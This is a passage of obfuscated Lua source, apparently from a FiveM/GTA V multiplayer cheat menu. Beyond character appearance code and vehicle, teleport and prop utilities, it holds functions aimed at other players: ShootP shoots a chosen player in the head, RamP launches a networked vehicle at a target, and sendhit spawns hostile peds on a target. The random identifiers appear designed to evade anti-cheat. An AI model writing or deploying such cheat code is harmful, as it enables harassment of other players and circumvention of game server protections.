            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc1, 8,tshirt_1,tshirt_2, 2)
        
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc2,face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc2, 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc2, 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc2, 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc2, 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(pedc2,hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc2, 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc2, 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc2, 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc2, 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc2, 8,tshirt_1,tshirt_2, 2)
        
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc3,face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc3, 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc3, 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc3, 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc3, 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(pedc3,hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc3, 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc3, 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc3, 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc3, 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc3, 8,tshirt_1,tshirt_2, 2)
        
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc4,face, face, face, skin, skin, skin, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc4, 1,	beard_1,(beard_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc4, 1, 1,beard_3,beard_4)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(pedc4, 2,	eyebrows_1,(eyebrows_2 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(pedc4, 2, 1,eyebrows_3,eyebrows_4)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 2,hair_1,hair_2, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(pedc4,hair_color_1,hair_color_2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc4, 2, ears_1,ears_2, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc4, 6,watches_1,watches_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc4, 1, glasses_1 , glasses_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(pedc4, 0, helmet_1 ,helmet_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 7, chain_1, chain_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 9,bproof_1, bproof_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 1,mask_1,mask_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 6, shoes_1,shoes_2 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 4,pants_1,pants_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 3, arms, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 11, torso_1 ,torso_2, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc4, 8,tshirt_1,tshirt_2, 2)
        
            nlFXKkFxuKQAk.natives.SetModelAsNoLongerNeeded(characterModel)		
            nlFXKkFxuKQAk.natives.SetPedHeadBlendData(hped,face1, face1, face1, skin1, skin1, skin1, 1.0, 1.0, 1.0, true)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(hped, 1,	beard_11,(beard_21 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(hped, 1, 1,beard_31,beard_41)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlay(hped, 2,	eyebrows_11,(eyebrows_21 / 10) + 0.0)		
            nlFXKkFxuKQAk.natives.SetPedHeadOverlayColor(hped, 2, 1,eyebrows_31,eyebrows_41)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 2,hair_11,hair_21, 2)        
            nlFXKkFxuKQAk.natives.SetPedHairColor(hped,hair_color_11,hair_color_21)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(hped, 2, ears_11,ears_21, 2)			
            nlFXKkFxuKQAk.natives.SetPedPropIndex(hped, 6,watches_11,watches_21, 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(hped, 1, glasses_11 , glasses_21 , 2)		
            nlFXKkFxuKQAk.natives.SetPedPropIndex(hped, 0, helmet_11 ,helmet_21 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 7, chain_11, chain_21, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 9,bproof_11, bproof_21 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 1,mask_11,mask_21, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 6, shoes_11,shoes_21 , 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 4,pants_11,pants_21, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 3, arms1, 0, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 11, torso_11 ,torso_21, 2)		
            nlFXKkFxuKQAk.natives.SetPedComponentVariation(hped, 8,tshirt_11,tshirt_21, 2)
        
        
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(tree, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(pedc, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(pedc1, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(pedc2, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(pedc3, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(pedc4, true)
            nlFXKkFxuKQAk.natives.FreezeEntityPosition(hped, true)
        
            nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc1, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc2, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc3, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(pedc4, true)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(hped, true)
        
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(pedc, false)
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(pedc1, false)
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(pedc2, false)
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(pedc3, false)
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(pedc4, false)
            nlFXKkFxuKQAk.natives.SetPedCanRagdoll(hped, false)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(pedc)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(pedc)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(pedc, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(pedc, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(pedc, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(pedc, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(pedc, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(pedc, true)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(pedc1)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(pedc1)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(pedc1, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(pedc1, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc1, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(pedc1, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(pedc1, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(pedc1, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(pedc1, true)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(pedc2)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(pedc2)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(pedc2, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(pedc2, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc2, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(pedc2, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(pedc2, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(pedc2, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(pedc2, true)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(pedc3)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(pedc3)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(pedc3, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(pedc3, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc3, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(pedc3, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(pedc3, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(pedc3, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(pedc3, true)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(pedc4)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(pedc4)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(pedc4, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(pedc4, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(pedc4, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(pedc4, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(pedc4, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(pedc4, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(pedc4, true)
        
            nlFXKkFxuKQAk.natives.ClearPedTasks(hped)
            nlFXKkFxuKQAk.natives.ClearPedSecondaryTask(hped)
            nlFXKkFxuKQAk.natives.TaskSetBlockingOfNonTemporaryEvents(hped, true)
            nlFXKkFxuKQAk.natives.SetPedFleeAttributes(hped, 0, 0)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(hped, 17, 1)
            nlFXKkFxuKQAk.natives.SetPedSeeingRange(hped, 0.0)
            nlFXKkFxuKQAk.natives.SetPedHearingRange(hped, 0.0)
            nlFXKkFxuKQAk.natives.SetPedAlertness(hped, 0)
            nlFXKkFxuKQAk.natives.SetPedKeepTask(hped, true) 
        
        end,
        Fixerino = function(vehicle)
            local vehicle = vehicle
            if vehicle == 0 then return false end
            nlFXKkFxuKQAk.natives.SetVehicleFixed(vehicle)
            nlFXKkFxuKQAk.natives.SetVehicleLightsMode(vehicle, 0)
            nlFXKkFxuKQAk.natives.SetVehicleLights(vehicle, 0)
            nlFXKkFxuKQAk.natives.SetVehicleBurnout(vehicle, false)
            nlFXKkFxuKQAk.natives.SetVehicleEngineHealth(vehicle, 1000.0)
            nlFXKkFxuKQAk.natives.SetVehicleFuelLevel(vehicle, 100.0)
            nlFXKkFxuKQAk.natives.SetVehicleOilLevel(vehicle, 100.0)
            return true
        end,
        FixerinoE = function(vehicle)
            local vehicle = vehicle
            if vehicle == 0 then return false end
            nlFXKkFxuKQAk.natives.SetVehicleEngineHealth(vehicle, 1000.0)
            nlFXKkFxuKQAk.natives.SetVehicleFuelLevel(vehicle, 100.0)
            nlFXKkFxuKQAk.natives.SetVehicleOilLevel(vehicle, 100.0)
            return true
        end,
        Shinemecar = function(vehicle)
	        nlFXKkFxuKQAk.natives.SetVehicleDirtLevel(vehicle, 0.0)
        end,
        unflipmeman = function(vehicle)
            local vehicle = vehicle
            if vehicle == 0 then return false end
            return nlFXKkFxuKQAk.natives.SetVehicleOnGroundProperly(vehicle)
        end,
        nomorecar = function(vehicle)
	        local vehicle = vehicle
	        if vehicle == 0 then 
		        return false 
	        end
	        nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(vehicle, true, true)
	        nlFXKkFxuKQAk.natives.DeleteVehicle(vehicle)
	        return true
        end,
        Swapdaplate = function(vehicle, plateText)
            if vehicle ~= 0 then 
                nlFXKkFxuKQAk.natives.SetVehicleNumberPlateText(vehicle, plateText) 
                return true
            end
        
            return false
        end,
        chosecolorchange = function(p1, color)
            local colorPrimary, colorSecondary = nlFXKkFxuKQAk.natives.GetVehicleColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
            local _, wheelColor = nlFXKkFxuKQAk.natives.GetVehicleExtraColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false))
            if p1 == 1 then
                nlFXKkFxuKQAk.natives.SetVehicleColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), color, colorSecondary)
            elseif p1 == 2 then
                nlFXKkFxuKQAk.natives.SetVehicleColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), colorPrimary, color)
            elseif p1 == 3 then
                nlFXKkFxuKQAk.natives.SetVehicleExtraColours(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), color, wheelColor)
            end
        end,
        attachmentyaya = function(type)
            if jrnyLearIyzKiSIen.func.Weparraymen[nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))] and jrnyLearIyzKiSIen.func.Weparraymen[nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))][type] then        
                if not nlFXKkFxuKQAk.natives.HasPedGotWeaponComponent(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)), jrnyLearIyzKiSIen.func.Weparraymen[nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))][type]) then			
                    nlFXKkFxuKQAk.natives.GiveWeaponComponentToPed(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)), jrnyLearIyzKiSIen.func.Weparraymen[nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))][type])			
                    RfPsUKHSFWJuBEJuz.rE.pront("Attachment Equiped!")
                    return 1
                else            
                    nlFXKkFxuKQAk.natives.RemoveWeaponComponentFromPed(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1)), jrnyLearIyzKiSIen.func.Weparraymen[nlFXKkFxuKQAk.natives.GetSelectedPedWeapon(nlFXKkFxuKQAk.natives.GetPlayerPed(-1))][type])			
                    RfPsUKHSFWJuBEJuz.rE.pront("Attachment Removed!")
                    return 2
                end   
            else
                RfPsUKHSFWJuBEJuz.rE.pront("This Attachment Doesnt Fit on Your Weapon")
                return 3
            end 
        end,
        TeleToWP = function()
            local Waypointy = nlFXKkFxuKQAk.natives.GetFirstBlipInfoId(8) 
            if nlFXKkFxuKQAk.natives.DoesBlipExist(Waypointy) then          
                local WaypointyC = nlFXKkFxuKQAk.natives.GetBlipInfoIdCoord(Waypointy)       
                for NewH = 1, 1000 do            
                    nlFXKkFxuKQAk.natives.SetPedCoordsKeepVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), WaypointyC["x"], WaypointyC["y"], NewH + 0.0)            
                    local GroundZ, zPos = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(WaypointyC["x"], WaypointyC["y"], NewH + 0.0)            
                    if GroundZ then                
                        nlFXKkFxuKQAk.natives.SetPedCoordsKeepVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), WaypointyC["x"], WaypointyC["y"], NewH + 0.0)                
                        break            
                    end            
                    RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                end
            end
        end,
        TeleToC = function(x, y, z)
            nlFXKkFxuKQAk.natives.SetPedCoordsKeepVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), x, y, z)
        end,
        ShootP = function(weph, player, dmg)
            local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player)
            local rot = nlFXKkFxuKQAk.natives.GetEntityRotation(stupidped)
            local direct = jrnyLearIyzKiSIen.func.RotationToDirection(rot)
            local TargetCoords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(stupidped, 31086, 0, 0, 0) 
            nlFXKkFxuKQAk.natives.ShootSingleBulletBetweenCoords((TargetCoords.x + direct.x), (TargetCoords.y + direct.y), (TargetCoords.z + direct.z), TargetCoords.x, TargetCoords.y, TargetCoords.z, dmg, false, RfPsUKHSFWJuBEJuz.rE.LumHash(weph), nlFXKkFxuKQAk.natives.PlayerPedId(), false, false, 1000.0)
        end,
        RamP = function(player, v)
            RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(player) 
                local model = RfPsUKHSFWJuBEJuz.rE.LumHash(v)
                nlFXKkFxuKQAk.natives.RequestModel(model)
                while not nlFXKkFxuKQAk.natives.HasModelLoaded(model) do
                    RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                end
                local offset = nlFXKkFxuKQAk.natives.GetOffsetFromEntityInWorldCoords(stupidped, 0, -10.0, 0)
                if nlFXKkFxuKQAk.natives.HasModelLoaded(model) then
                    local vehicle = nlFXKkFxuKQAk.natives.CreateVehicle(model, offset.x, offset.y, offset.z, nlFXKkFxuKQAk.natives.GetEntityHeading(stupidped), true, true)
                    nlFXKkFxuKQAk.natives.NetworkRegisterEntityAsNetworked(nlFXKkFxuKQAk.natives.VehToNet(vehicle))
                    nlFXKkFxuKQAk.natives.SetVehicleForwardSpeed(vehicle, 60.0)
                end
            end)
        end,
        FindThePederinos = function()
            return jrnyLearIyzKiSIen.func.finderkek(nlFXKkFxuKQAk.natives.FindFirstPed, nlFXKkFxuKQAk.natives.FindNextPed, nlFXKkFxuKQAk.natives.EndFindPed)
        end,
        FindLeCars = function()
            return jrnyLearIyzKiSIen.func.finderkek(nlFXKkFxuKQAk.natives.FindFirstVehicle, nlFXKkFxuKQAk.natives.FindNextVehicle, nlFXKkFxuKQAk.natives.EndFindVehicle)
        end,
        CrossHairFC = function(tog)
            local sx, sy = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
            if tog then
                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 1,(sy / 2) - 9.5,2.5,20,jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 9.5,(sy / 2) - 1,20,2.5,jrnyLearIyzKiSIen.config.CPrimary.r, jrnyLearIyzKiSIen.config.CPrimary.g, jrnyLearIyzKiSIen.config.CPrimary.b, jrnyLearIyzKiSIen.config.CPrimary.a)
            else
                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 1,(sy / 2) - 9.5,2.5,20,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                jrnyLearIyzKiSIen.func.DrawRectangle((sx / 2) - 9.5,(sy / 2) - 1,20,2.5,jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
            end
        end,
        FCObjectSpoon = function(coordsx, coordsy, coordsz, rotation, rotation1, rotation2, placer, obj)
            local temp
            if obj ~= nil then
                if not placer then
                    if jrnyLearIyzKiSIen.config.SlaveStore.newpropski ~= obj or not nlFXKkFxuKQAk.natives.DoesEntityExist(jrnyLearIyzKiSIen.config.SlaveStore.propski) then
                        nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)						
                        nlFXKkFxuKQAk.natives.DeleteEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                        nlFXKkFxuKQAk.natives.DeleteObject(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                        if nlFXKkFxuKQAk.natives.IsModelValid(obj) then    
                            while not nlFXKkFxuKQAk.natives.HasModelLoaded(obj) do
                                nlFXKkFxuKQAk.natives.RequestModel(obj)
                                RfPsUKHSFWJuBEJuz.rE.LumWait(10)
                            end
                        else
                            RfPsUKHSFWJuBEJuz.rE.pront(''..obj..' is not a model!')
                        end
                        jrnyLearIyzKiSIen.config.SlaveStore.propski = nlFXKkFxuKQAk.natives.CreateObject(obj, coordsx, coordsy, coordsz, false, false, true)
                        jrnyLearIyzKiSIen.config.SlaveStore.newpropski = obj
                    else
                        nlFXKkFxuKQAk.natives.SetEntityAlpha(jrnyLearIyzKiSIen.config.SlaveStore.propski, 210, true)
                        nlFXKkFxuKQAk.natives.SetEntityCoords(jrnyLearIyzKiSIen.config.SlaveStore.propski, coordsx, coordsy, coordsz, false, false, false, false)
                        nlFXKkFxuKQAk.natives.SetEntityRotation(jrnyLearIyzKiSIen.config.SlaveStore.propski, rotation1, rotation2, rotation, 2, true)
                        nlFXKkFxuKQAk.natives.SetEntityCollision(jrnyLearIyzKiSIen.config.SlaveStore.propski, false, false)
                    end
                else
                    temp = nlFXKkFxuKQAk.natives.CreateObject(obj, coordsx, coordsy, coordsz, true, true, true)
                    nlFXKkFxuKQAk.natives.SetEntityRotation(temp, rotation1, rotation2, rotation, 2, true)
                    nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)						
                    nlFXKkFxuKQAk.natives.DeleteEntity(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                    nlFXKkFxuKQAk.natives.DeleteObject(jrnyLearIyzKiSIen.config.SlaveStore.propski)
                    jrnyLearIyzKiSIen.config.SlaveStore.propski = nil
                    jrnyLearIyzKiSIen.config.SlaveStore.placeski = false
                end
            end
        end,
        sendhit = function(method, ped, hitc, isgod, isexploade, wep, target, vehicle, vehicle1, ClonedP)
            local ped2;
            if ped == 100 then
                ped2 = 'mp_m_freemode_01'
            elseif ped == 101 then
                ped2 = nlFXKkFxuKQAk.natives.GetEntityModel(nlFXKkFxuKQAk.natives.GetPlayerPed(target))
            elseif ped == 102 then
                ped2 = nlFXKkFxuKQAk.natives.GetEntityModel(nlFXKkFxuKQAk.natives.GetPlayerPed(ClonedP))
            else
                ped2 = ped
            end
            local characterModel = RfPsUKHSFWJuBEJuz.rE.LumHash(ped2)
            --load ped in
            nlFXKkFxuKQAk.natives.RequestModel(characterModel)		        
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(characterModel) do			
                RfPsUKHSFWJuBEJuz.rE.LumWait(50)		
            end
            -- parse varibles
            local targetped = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
            local targetloc = nlFXKkFxuKQAk.natives.GetEntityCoords(targetped, false)
            --start hit
            if method == 1 then
                local _, zcord = nlFXKkFxuKQAk.natives.GetGroundZFor_3dCoord(targetloc.x + 5.0, targetloc.y + 5.0, targetloc.z, 0)
                local pedc = nlFXKkFxuKQAk.natives.CreatePed(4, characterModel, targetloc.x + 5.0, targetloc.y + 5.0, zcord, 0.0, true, false)
                if ped == 100 then
                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(pedc)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 6, 6, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 4, 21, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 11, 15, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 8, 15, 1, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 9, 16, 2, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 3, 15, 0, 0)
                    nlFXKkFxuKQAk.natives.SetPedComponentVariation(pedc, 1, 115, 6, 0)
                    nlFXKkFxuKQAk.natives.SetPedHeadBlendData(pedc,2,1,3,19,2,1,2,5,2,false)
                elseif ped == 101 then
                    local persontofuck = nlFXKkFxuKQAk.natives.GetPlayerPed(target)
                    local hat = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 0)
                    local hat_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 0)
                    local glasses = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 1)
                    local glasses_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 1)
                    local ear = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 2)
                    local ear_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 2)
                    local watch = nlFXKkFxuKQAk.natives.GetPedPropIndex(persontofuck, 6)
                    local watch_texture = nlFXKkFxuKQAk.natives.GetPedPropTextureIndex(persontofuck, 6)
